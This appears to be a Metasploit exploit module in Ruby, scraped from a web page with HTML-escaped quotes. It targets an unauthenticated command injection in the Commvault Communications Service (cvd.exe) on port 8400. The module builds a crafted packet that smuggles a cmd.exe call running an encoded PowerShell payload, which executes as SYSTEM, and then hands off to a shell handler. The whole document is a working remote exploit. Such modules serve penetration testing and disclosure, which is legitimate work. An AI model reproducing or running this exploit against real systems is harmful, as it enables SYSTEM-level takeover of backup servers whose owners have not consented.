# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core/exploit/powershell&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Powershell
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Commvault Communications Service (cvd) Command Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a command injection vulnerability
        discovered in Commvault Service v11 SP5 and earlier versions (tested in v11 SP5
        and v10). The vulnerability exists in the cvd.exe service and allows an
        attacker to execute arbitrary commands in the context of the service. By
        default, the Commvault Communications service installs and runs as SYSTEM in
        Windows and does not require authentication. This vulnerability was discovered
        in the Windows version. The Linux version wasn&#039;t tested.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;b0yd&#039;, # @rwincey / Vulnerability Discovery and MSF module author
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://www.securifera.com/advisories/sec-2017-0001/&#039;]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Commvault Communications Service (cvd) / Microsoft Windows 7 and higher&#039;,
            {
              &#039;Arch&#039; => [ARCH_X64, ARCH_X86]
            }
          ],
        ],
      &#039;Privileged&#039;     => true,
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Dec 12 2017&#039;))
 
      register_options([Opt::RPORT(8400)])
 
    end
 
  def exploit
 
    buf = build_exploit
    print_status("Connecting to Commvault Communications Service.")
    connect
    print_status("Executing payload")
    #Send the payload
    sock.put(buf)
    #Handle the shell
    handler
    disconnect
 
  end
 
 
  def build_exploit
 
    #Get encoded powershell of payload
    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, method: &#039;reflection&#039;)
    #Remove additional cmd.exe call
    psh = "powershell"
    idx = command.index(psh)
    command = command[(idx)..-1]
 
    #Build packet
    cmd_path = &#039;C:\Windows\System32\cmd.exe&#039;
    msg_type = 9
    zero = 0
    payload = ""
    payload += make_nops(8)
    payload += [msg_type].pack(&#039;I>&#039;)
    payload += make_nops(328)
    payload += cmd_path
    payload += ";"
    payload += &#039; /c "&#039;
    payload += command
    payload += &#039;" && echo &#039;
    payload += "\x00"
    payload += [zero].pack(&#039;I>&#039;)
 
    #Add length header and payload
    ret_data = [payload.length].pack(&#039;I>&#039;)
    ret_data += payload
 
    ret_data
 
  end
end

